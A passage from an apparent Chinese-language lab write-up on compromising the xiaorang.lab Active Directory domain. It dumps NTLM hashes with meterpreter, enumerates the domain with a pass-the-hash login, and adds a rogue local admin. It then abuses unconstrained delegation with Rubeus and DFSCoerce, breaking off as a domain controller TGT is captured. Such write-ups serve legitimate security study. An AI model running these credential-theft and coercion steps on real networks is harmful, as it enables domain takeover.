</span><span class="token number" style="color:#36acaa">95</span><span class="token plain"> 0c f4 ba 8d</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>同时获取用户的哈希信息</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> hashdump</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Adrian:1003:aad3b435b51404eeaad3b435b51404ee:3008c87294511142799dca1191e69a0f:::</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:44d8d68ed7968b02da0ebddafd2dd43e:::</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>使用 <a href="https://github.com/lzzbb/Adinfo" target="_blank" rel="noopener noreferrer">lzzbb/Adinfo: 域信息收集工具</a> 进一步抓取域内信息</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Adrian</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Desktop</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> .</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Adinfo_win.exe </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> xiaorang.lab </span><span class="token parameter variable" style="color:#36acaa">--dc</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.7 </span><span class="token parameter variable" style="color:#36acaa">-u</span><span class="token plain"> WIN19$ </span><span class="token parameter variable" style="color:#36acaa">-H</span><span class="token plain"> 22efd36d08f27afdf0628d9ba2bff827</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           _____  _        __</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     /</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  __ </span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">      / _</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    /  </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">_ _ __ </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">_ ___</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   / /</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;_ \|  _/ _ \     Tools that collect information from domain</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">  / ____ \| |__| | | | | | || (_) |</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"> /_/    \_\_____/|_|_| |_|_| \___/     v1.5 by lzz</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Try to connect &#x27;</span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.7</span><span class="token string" style="color:#e3116c">&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[c] Auth Domain: xiaorang.lab</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[c] Auth user: WIN19$</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[c] Auth hash: 22efd36d08f27afdf0628d9ba2bff827</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[c] connected successfully,try to dump domain info</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] DomainVersion found!</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">                    [+] Windows 2016 Server operating system</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Domain SID:</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">                    [+] S-1-5-21-1913786442-1328635469-1954894845</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Domain MAQ found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">                    [+] 10</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Domain Account Policy found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">                    [+] pwdHistory: 24</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">                    [+] minPwdLength: 7</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">                    [+] minPwdAge: 1(day)</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">                    [+] maxPwdAge: 42(day)</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">                    [+] lockoutThreshold: 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">                    [+] lockoutDuration: 30(min)</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Domain Controllers: 1 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">                    [+] DC01$  ==&gt;&gt;&gt;   Windows Server 2016 Datacenter  [10.0 (14393)]  ==&gt;&gt;&gt;  172.22.4.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] ADCS has not found!</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Domain Exchange Server: 0 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Domain All DNS:</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">                    [+] Domain Dns 3 found,Saved in All_DNS.csv</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Domain Trusts: 0 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] SPN: 39 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Domain GPOs: 2 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Domain Admins: 1 users found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">                    [+]Administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Enterprise Admins: 1 users found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">                    [+]Administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] administrators: 1 users found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">                    [+]Administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Backup Operators: 0 users found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Users: 6 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] User with Mail: 0 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Only_name_and_Useful_Users: 3 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Only_admincount=1_andUseful_Users: 1 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Locked Users: 0 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Disabled Users: 3 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Users with passwords not set to expire: 2 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Domain Computers: 5 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Only_name_and_Useful_computers: 5 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Groups: 49 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Domain OUs: 1 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] LAPS Not found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] LAPS passwords: 0 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] SensitiveDelegate Users: 0 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] AsReproast Users: 0 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Kerberoast Users: 1 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">                    [+] CN=krbtgt,CN=Users,DC=xiaorang,DC=lab  ==&gt;&gt;&gt;  kadmin/changepw</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] SIDHistory Users: 0 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] CreatorSID Users: 2 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">                    [+] WIN-3X7U15C2XDM$  ==&gt;&gt;&gt;  Marcus</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">                    [+] WIN-YUUAW2QG9MF$  ==&gt;&gt;&gt;  Marcus</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] RBCD Users: 0 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Unconstrained Deligation Users: 1 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">                    [+] WIN19$</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Constrained Deligation Users: 0 found</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] Krbtgt password last set time: 2022-06-22 22:54:34 +0800 CST</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">[i] CSVs written to &#x27;</span><span class="token plain">csv&#x27; directory </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Adrian</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Desktop</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Execution took </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">.0226163s</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在域内发现一个非约束委派，尝试利用</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="17222445-xiaorangwin19-非约束委派">172.22.4.45 XIAORANG\WIN19 非约束委派<a href="#17222445-xiaorangwin19-非约束委派" class="hash-link" aria-label="172.22.4.45 XIAORANG\WIN19 非约束委派的直接链接" title="172.22.4.45 XIAORANG\WIN19 非约束委派的直接链接">​</a></h2>
<p>首先，创建新的管理员账号</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">net user randark admin123 /add</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net localgroup administrators randark /add</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>登陆新的管理员账号，上传 <code>Rubeus.exe</code> 进行票据抓取</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">randark</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Desktop</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> .</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   ______        _</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_____ </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   _____</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">_   _</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">__  _____ _   _  ___</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  __  /</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  _ </span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> ___ </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">/___</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">_</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">_</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> ____</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">_</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">___ </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">_</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">_</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">____/</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">____/</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">_____</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">____/</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">___/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  v2.2.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Action: TGT Monitoring</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Target user     </span><span class="token builtin class-name">:</span><span class="token plain"> DC01$</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Monitoring every </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> seconds </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> new TGTs</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>用 <code>dfscoerce</code> 触发 RPC 使 DC 向 WIN19 认证</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~/pocs</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ proxychains4 python3 ./DFSCoerce/dfscoerce.py </span><span class="token parameter variable" style="color:#36acaa">-u</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;WIN19$&quot;</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-hashes</span><span class="token plain"> :22efd36d08f27afdf0628d9ba2bff827 </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> xiaorang.lab win19 </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> config </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> found: /etc/proxychains4.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> DLL init: proxychains-ng </span><span class="token number" style="color:#36acaa">4.17</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Connecting to ncacn_np:172.22.4.7</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">PIPE</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">netdfs</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Strict chain  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:10001  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.7:445  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Successfully bound</span><span class="token operator" style="color:#393A34">!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Sending NetrDfsRemoveStdRoot</span><span class="token operator" style="color:#393A34">!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NetrDfsRemoveStdRoot</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServerName:                      </span><span class="token string" style="color:#e3116c">&#x27;win19\x00&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RootShare:                       </span><span class="token string" style="color:#e3116c">&#x27;test\x00&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ApiFlags:                        </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DFSNM SessionError: code: 0x490 - ERROR_NOT_FOUND - Element not found.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>成功监听到票据</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/7/24 </span><span class="token number" style="color:#36acaa">2</span><span class="token plain">:18:02 UTC - Found new TGT:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  User                  </span><span class="token builtin class-name">:</span><span class="token plain">  DC01</span><span class="token variable" style="color:#36acaa">$@</span><span class="token plain">XIAORANG.LAB</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  StartTime             </span><span class="token builtin class-name">:</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/7/24 </span><span class="token number" style="color:#36acaa">8</span><span class="token plain">:15:17</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  EndTime               </span><span class="token builtin class-name">:</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/7/24 </span><span class="token number" style="color:#36acaa">18</span><span class="token plain">:15:17</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  RenewTill             </span><span class="token builtin class-name">:</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/7/31 </span><span class="token number" style="color:#36acaa">8</span><span class="token plain">:15:17</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Flags                 </span><span class="token builtin class-name">:</span><span class="token plain">  name_canonicalize, pre_authent, renewable, forwarded, forwardable</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Base64EncodedTicket   </span><span class="token builtin class-name">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    